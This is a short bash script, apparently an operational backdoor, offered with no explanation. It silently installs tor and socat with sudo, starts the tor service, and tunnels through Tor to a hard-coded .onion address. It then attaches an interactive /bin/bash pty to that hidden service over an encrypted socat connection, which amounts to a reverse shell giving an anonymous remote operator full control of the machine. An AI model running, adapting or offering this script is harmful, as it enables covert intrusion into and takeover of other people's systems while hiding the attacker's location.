#!/bin/bash

CMD1="tor"
CMD2="socat"

if command -v "$CMD1" &>/dev/null && command -v "$CMD2" &>/dev/null ; then
    echo ""
else
    if command -v apt &>/dev/null; then
        sudo apt update && sudo apt install -y "$CMD1" "$CMD2"
    elif command -v dnf &>/dev/null; then
        sudo dnf install -y "$CMD1" "$CMD2"
    elif command -v yum &>/dev/null; then
        sudo yum install -y "$CMD1" "$CMD2"
    fi
fi

status_tor=$(systemctl --type=service --state=running |  grep tor | grep "loaded active running Anonymizing overlay network for TCP")
if  [[ -z "$status_tor" ]]; then
        systemctl start tor.service;
        sleep 240
else
        echo -n ""
fi

PORT_PROXY_INITIAL_CONNECTION=$(ss -tulnp | awk '{print $5}' | grep 9999)
if [[ -z "$PORT_PROXY_INITIAL_CONNECTION" ]]; then
        socat TCP-LISTEN:9999,reuseaddr SOCKS5-CONNECT:localhost:9050:wznpsql7l4pdp4wetxd45cm5xqef6vhsleirckixnql7nsiv3xc4k6id.onion:4444 &
fi


PORT=$(socat - OPENSSL:localhost:9999,verify=0)

sleep 2

PORT_PROXY_FOR_SEND_PROXY_PORT=$(ss -tulnp | awk '{print $5}' | grep 8888)

sleep 4
if [[ -z "$PORT_PROXY_FOR_SEND_PROXY_PORT" ]]; then
        socat TCP-LISTEN:8888,reuseaddr SOCKS5-CONNECT:localhost:9050:wznpsql7l4pdp4wetxd45cm5xqef6vhsleirckixnql7nsiv3xc4k6id.onion:5555 &
fi

for PORT_LISTEN in {30000..40000}; do
        PORT_USED=$(ss -tunap | awk '{print $5}' | grep "$PORT_LISTEN") # this will get establish connection also, not just Listen
        if [[  -z "$PORT_USED" ]]; then
                socat TCP-LISTEN:"$PORT_LISTEN",reuseaddr,fork SOCKS5-CONNECT:localhost:9050:wznpsql7l4pdp4wetxd45cm5xqef6vhsleirckixnql7nsiv3xc4k6id.onion:"$PORT" &
                echo "$PORT_LISTEN" | socat - OPENSSL:localhost:8888,verify=0 &
                break
        fi
done

sleep 10
socat EXEC:'/bin/bash -li',pty,stderr,setsid,sigint,sane OPENSSL:localhost:"$PORT_LISTEN",verify=0 &
